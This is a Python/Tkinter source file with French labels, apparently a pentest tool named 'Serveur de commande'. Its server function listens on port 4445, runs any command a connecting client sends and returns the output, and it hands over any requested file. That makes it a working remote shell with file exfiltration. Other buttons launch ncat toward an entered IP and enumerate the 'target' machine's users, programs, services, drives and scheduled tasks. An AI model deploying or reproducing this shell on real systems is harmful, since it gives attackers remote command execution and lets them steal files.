def open_main_window2():
    welcome_window.destroy()
    main_windows2()

def main_windows2():
    def start_server(ip_address, text_widget):
        port = 4445
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((ip_address, port))
        listener.listen(1)

        text_widget.insert(tk.END, f"[*] Écoute sur {ip_address}:{port}...\n")

        while True:
            client, addr = listener.accept()
            text_widget.insert(tk.END, f"[*] Nouvelle connexion de {addr[0]}:{addr[1]}\n")

            while True:
                command = client.recv(1024).decode()

                if command.startswith("download "):
                    file_path = command.split(' ')[1]
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as file:
                            client.sendall(file.read())
                    else:
                        client.sendall(b"fichier introuvable")
                else:
                    result = subprocess.getoutput(command)
                    client.sendall(result.encode())

                    text_widget.insert(tk.END, f"Commande reçue : {command}\n")
                    text_widget.insert(tk.END, f"Résultat :\n{result}\n\n")
                    text_widget.see(tk.END)

            client.close()

        listener.close()

    def start_server_thread(ip_address, text_widget):
        server_thread = Thread(target=start_server, args=(ip_address, text_widget))
        server_thread.daemon = True
        server_thread.start()

    def start_server_handler():
        ip_address = ip_entry.get()
        if ip_address:
            start_server_thread(ip_address, text_output)
        else:
            text_output.insert(tk.END, "Veuillez saisir une adresse IP valide.\n")

    def execute_ncat():
        ip_address = ip_entry.get()
        if ip_address:
            subprocess.Popen(["ncat", ip_address, "4445"])
        else:
            text_output.insert(tk.END, "Veuillez saisir une adresse IP valide pour utiliser ncat.\n")

    def execute_code2():
        c = wmi.WMI()

        system_info = c.Win32_OperatingSystem()[0]
        hostname = system_info.CSName
        osversion = system_info.Caption
        osarch = system_info.OSArchitecture
        uptime = system_info.LastBootUpTime
        timezone = system_info.CurrentTimeZone

        text_output.insert(tk.END, f"Hostname: {hostname}\n")
        text_output.insert(tk.END, f"Operating System: {osversion}\n")
        text_output.insert(tk.END, f"Architecture: {osarch}\n")
        text_output.insert(tk.END, f"Uptime: {uptime}\n")
        text_output.insert(tk.END, f"Timezone: {timezone}\n\n")

        users = c.Win32_UserAccount()
        text_output.insert(tk.END, "Users:\n")
        for user in users:
            text_output.insert(tk.END, f"{user.Caption}\n")

        programs = c.Win32_Product()
        text_output.insert(tk.END, "\nInstalled Programs:\n")
        for program in programs:
            text_output.insert(tk.END, f"{program.Name}\n")

        services = c.Win32_Service()
        text_output.insert(tk.END, "\nServices:\n")
        for service in services:
            text_output.insert(tk.END, f"{service.Name} - {service.DisplayName}\n")

        text_output.insert(tk.END, "\nNetwork Adapters:\n")
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        for network_adapter in network_adapters:
            ip_addresses = [ip for ip in network_adapter.IPAddress if ip.startswith('192.168.')]
            if ip_addresses:
                text_output.insert(tk.END, f"Interface Name: {network_adapter.Description}\n")
                text_output.insert(tk.END, f"IP Address: {', '.join(ip_addresses)}\n")

        text_output.insert(tk.END, "\nDrives:\n")
        drives = c.Win32_LogicalDisk()
        for drive in drives:
            text_output.insert(tk.END, f"Drive letter: {drive.DeviceID}\n")
            text_output.insert(tk.END, f"File system: {drive.FileSystem}\n")
            text_output.insert(tk.END, f"Free space: {round(drive.FreeSpace / (1024 ** 3), 2)} GB\n")
            text_output.insert(tk.END, f"Total space: {round(drive.Size / (1024 ** 3), 2)} GB\n")

        text_output.insert(tk.END, "\nScheduled Tasks:\n")
        tasks = c.Win32_ScheduledJob()
        for task in tasks:
            text_output.insert(tk.END, f"Task Name: {task.Name}\n")
            text_output.insert(tk.END, f"Description: {task.Description}\n")
            text_output.insert(tk.END, f"Last Run Time: {task.LastRun}\n")
            text_output.insert(tk.END, f"Next Run Time: {task.NextRun}\n")
            text_output.insert(tk.END, f"Executed as: {task.Owner}\n")
            task_info = c.Win32_ScheduledJob.Get(ScheduledJobID=task.ScheduledJobID)
            text_output.insert(tk.END, f"Executable File: {task_info.Command}\n")
            text_output.insert(tk.END, f"Command Line Arguments: {task_info.Arguments}\n")
            text_output.insert(tk.END, "-----------------------------------\n")

    def generate_pdf(result):
        filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
        if filename:
            c = canvas.Canvas(filename, pagesize=letter)
            c.drawString(100, 750, "Nmap Report")
            c.drawString(100, 730, "-" * 50)
            c.drawString(100, 700, "Scan Result:")
            y = 680
            lines = result.split("\n")
            page_number = 1
            for line in lines:
                if y < 100:
                    c.showPage()
                    c.drawString(100, 750, f"Nmap Report (Page {page_number})")
                    c.drawString(100, 730, "-" * 50)
                    c.drawString(100, 700, "Scan Result:")
                    y = 680
                    page_number += 1
                c.drawString(100, y, line)
                y -= 15
            c.save()

    def generate_pdf_handler():
        result = text_output.get("1.0", tk.END)
        generate_pdf(result)

    root = tk.Tk()
    root.title("Serveur de commande")
    root.attributes("-alpha", 0.95)

    ip_label = tk.Label(root, text="Adresse IP:", bg='#1e1e1e', fg='#ffbb00', font=('Helvetica', 12, 'bold'))
    ip_label.pack(pady=5)
    ip_entry = tk.Entry(root, bg='#333333', fg='#ffffff', font=('Helvetica', 12))
    ip_entry.pack(pady=5)

    start_button = tk.Button(root, text="Démarrer le serveur", command=start_server_handler, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    start_button.pack(pady=5)

    ncat_button = tk.Button(root, text="Exécuter ncat", command=execute_ncat, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    ncat_button.pack(pady=5)

    execute_button = tk.Button(root, text="Afficher les informations de la cible", command=execute_code2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    execute_button.pack(pady=5)

    generate_pdf_button = tk.Button(root, text="Générer PDF", command=generate_pdf_handler, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    generate_pdf_button.pack(pady=5)

    text_output = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
    text_output.pack(pady=10)

    root.mainloop()